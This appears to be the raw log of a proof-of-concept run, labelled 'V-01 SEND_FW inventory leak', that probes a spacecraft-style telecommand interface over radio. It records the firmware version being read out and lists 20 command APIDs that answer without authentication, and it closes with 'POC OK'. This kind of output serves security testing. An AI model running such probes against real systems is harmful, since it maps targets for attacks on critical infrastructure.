@@ -1,0 +1,71 @@
+[   0.000] ========================================================================
+[   0.000] V-01 SEND_FW inventory leak
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x03 via=radio AES  payload=-
+[   0.001] <-- TM apid=0x03 AES len=5
+[   0.001] SEND_FW payload=0100000100 -> firmware version 1.0.0
+[   0.001] --> TC apid=0x0C via=radio AES  payload=-
+[   0.002] <-- TM apid=0x0C AES len=27
+[   0.002] GET_STATUS flags=0x1F: secure_link=True payload_armed=False usb_debug=False
+[   0.002] --> TC apid=0x01 via=radio AES  payload=-
+[   0.002] <-- TM apid=0x01 AES len=5
+[   0.002] --> TC apid=0x03 via=radio AES  payload=-
+[   0.003] <-- TM apid=0x03 AES len=5
+[   0.003] --> TC apid=0x04 via=radio AES  payload=0000
+[   0.003] --> TC apid=0x05 via=radio AES  payload=02
+[   0.003] --> TC apid=0x06 via=radio AES  payload=039270726f6265
+[   0.004] <-- TM apid=0x06 AES len=5
+[   0.004] --> TC apid=0x07 via=radio AES  payload=-
+[   0.005] <-- TM apid=0x07 AES len=24
+[   0.006] <-- TM apid=0x07 AES len=24
+[   0.006] <-- TM apid=0x07 AES len=24
+[   0.007] <-- TM apid=0x07 AES len=24
+[   0.007] <-- TM apid=0x07 AES len=24
+[   0.008] <-- TM apid=0x07 AES len=24
+[   0.008] <-- TM apid=0x07 AES len=24
+[   0.009] <-- TM apid=0x07 AES len=24
+[   0.009] <-- TM apid=0x07 AES len=24
+[   0.010] <-- TM apid=0x07 AES len=24
+[   0.010] <-- TM apid=0x07 AES len=24
+[   0.011] <-- TM apid=0x07 AES len=24
+[   0.011] <-- TM apid=0x07 AES len=24
+[   0.012] <-- TM apid=0x07 AES len=24
+[   0.012] <-- TM apid=0x07 AES len=24
+[   0.013] <-- TM apid=0x07 AES len=23
+[   0.013] --> TC apid=0x0B via=radio AES  payload=a5000020c35a
+[   0.014] <-- TM apid=0x0B AES len=37
+[   0.014] --> TC apid=0x0C via=radio AES  payload=-
+[   0.015] <-- TM apid=0x0C AES len=27
+[   0.015] --> TC apid=0x0D via=radio AES  payload=01
+[   0.015] <-- TM apid=0x0D AES len=4
+[   0.015] --> TC apid=0x0E via=radio AES  payload=-
+[   0.016] <-- TM apid=0x0E AES len=30
+[   0.016] --> TC apid=0x0F via=radio AES  payload=-
+[   0.017] <-- TM apid=0x0F AES len=10
+[   0.017] --> TC apid=0x11 via=radio AES  payload=00
+[   0.017] <-- TM apid=0x11 AES len=9
+[   0.017] --> TC apid=0x13 via=radio AES  payload=-
+[   0.018] <-- TM apid=0x13 AES len=23
+[   0.018] --> TC apid=0x17 via=radio AES  payload=000000000000000000000000000000000000000000
+[   0.019] <-- TM apid=0x17 clear len=19
+[   0.019] --> TC apid=0x19 via=radio AES  payload=000000200800
+[   0.019] <-- TM apid=0x19 clear len=15
+[   0.019] --> TC apid=0x1D via=radio AES  payload=00
+[   0.019] <-- TM apid=0x1D clear len=18
+[   0.019] --> TC apid=0x1E via=radio AES  payload=02
+[   0.020] <-- TM apid=0x1E clear len=3
+[   0.020] --> TC apid=0x1F via=radio AES  payload=03
+[   0.020] <-- TM apid=0x1F clear len=32
+[   0.020] --> TC apid=0x20 via=radio AES  payload=-
+[   0.021] <-- TM apid=0x20 clear len=18
+[   0.021] --> TC apid=0x21 via=radio AES  payload=00
+[   0.021] <-- TM apid=0x21 clear len=6
+[   0.021] --> TC apid=0x23 via=radio AES  payload=01
+[   0.021] <-- TM apid=0x09 AES len=12
+[   0.021] --> TC apid=0x25 via=radio AES  payload=01
+[   0.022] <-- TM apid=0x25 clear len=6
+[   0.022] unauthenticated responders (20): ['0x1', '0x3', '0x6', '0x7', '0xb', '0xc', '0xd', '0xe', '0xf', '0x11', '0x13', '0x17', '0x19', '0x1d', '0x1e', '0x1f', '0x20', '0x21', '0x23', '0x25']
+[   0.022] attacker holds exact CPE (software + version + live APID map) and can match it to the published vulnerability catalogue
+[   0.022] ========================================================================
+[   0.022] POC OK
+[   0.022] ========================================================================
